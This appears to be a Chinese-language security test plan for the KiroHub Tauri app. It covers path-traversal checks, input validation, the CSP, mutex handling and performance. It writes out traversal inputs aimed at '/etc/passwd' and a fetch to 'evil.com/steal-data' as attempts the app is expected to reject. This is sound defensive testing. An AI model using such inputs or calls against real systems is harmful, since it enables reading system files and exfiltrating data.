# KiroHub 安全测试脚本

## 1. 路径遍历防护测试

测试 steering.rs 的路径验证是否正常工作。

### 预期结果：所有恶意路径应该被拒绝

```javascript
// 在浏览器控制台或前端代码中测试
import { invoke } from '@tauri-apps/api/core'

// ❌ 应该被拒绝的恶意路径
await invoke('get_steering_file', { fileName: '../../../etc/passwd' })
// 预期错误: "文件名中不允许包含 '..'"

await invoke('get_steering_file', { fileName: '/etc/passwd' })
// 预期错误: "不允许使用绝对路径"

await invoke('get_steering_file', { fileName: 'C:\\Windows\\System32\\config' })
// 预期错误: "不允许使用路径前缀"

await invoke('get_steering_file', { fileName: 'subdir/file.md' })
// 预期错误: "文件名不能包含目录路径"

await invoke('get_steering_file', { fileName: 'test.txt' })
// 预期错误: "文件必须是 .md 格式"

// ✅ 应该通过的合法路径
await invoke('get_steering_file', { fileName: 'my-steering.md' })
// 预期成功: 返回文件内容或"文件不存在"错误
```

## 2. 输入验证测试

测试 account_cmd.rs 的输入验证。

```javascript
// ❌ 无效的 refresh_token（太短）
await invoke('add_account_by_social', {
  refreshToken: 'short',
  provider: 'Google'
})
// 预期错误: "RefreshToken 长度过短"

// ❌ 无效的 provider
await invoke('add_account_by_social', {
  refreshToken: 'aor-validtokenwith20chars...',
  provider: 'InvalidProvider'
})
// 预期错误: "不支持的 provider: InvalidProvider"

// ❌ 空的 client_id
await invoke('add_account_by_idc', {
  refreshToken: 'valid-refresh-token-here...',
  clientId: '',
  clientSecret: 'secret',
  region: 'us-east-1'
})
// 预期错误: "client_id 不能为空"
```

## 3. Mutex Lock 错误处理测试

模拟 Mutex 毒化场景（需要多线程压力测试）：

```bash
# 并发调用测试
for i in {1..100}; do
  tauri invoke get_accounts &
done
wait

# 预期: 所有调用都应该返回 Result，没有 panic
```

## 4. CSP 测试

在浏览器控制台测试 CSP 是否生效：

```javascript
// ❌ 应该被 CSP 阻止
fetch('https://evil.com/steal-data')
// 预期: CSP 错误

// ✅ 应该被允许
fetch('https://prod.us-east-1.auth.desktop.kiro.dev/refreshToken')
// 预期: 正常请求（可能返回 401，但不是 CSP 阻止）
```

## 5. React.memo 性能测试

在 React DevTools Profiler 中：

1. 打开 AccountManager 页面
2. 点击"开始录制"
3. 修改搜索框（触发过滤）
4. 停止录制

**预期改进**:
- AccountCard 组件只重渲染匹配搜索的项
- 未修改的卡片不应重渲染

## 6. 回归测试清单

- [ ] 账号管理功能正常（添加、删除、刷新）
- [ ] 账号切换功能正常
- [ ] Steering 文件读写正常（合法文件名）
- [ ] MCP 配置读写正常
- [ ] 设置页面保存正常
- [ ] 自动刷新定时器正常
- [ ] 主题切换正常
- [ ] 多语言切换正常

## 7. 安全验证清单

- [x] 路径遍历攻击已防护
- [x] 日志中无敏感信息泄露（仅 debug 模式）
- [x] unwrap() panic 已修复
- [x] CVE-2025-31477 已修复
- [x] CSP 已配置
- [ ] 敏感数据加密（待实现）
- [x] 输入验证已添加

## 8. 性能基准

运行 Tauri 应用并测量：

1. **启动时间**: 从启动到窗口显示
2. **列表渲染**: 50 个账号时的首屏时间
3. **内存使用**: 空闲状态下的内存占用
4. **CPU 使用**: 后台定时器的 CPU 消耗

**目标改进**:
- 列表交互响应: 20-35% 提升（React.memo）
- 后台 CPU: 15-20% 降低（定时器去重）
- 编译时间: 5-10% 减少（tokio 功能集优化）
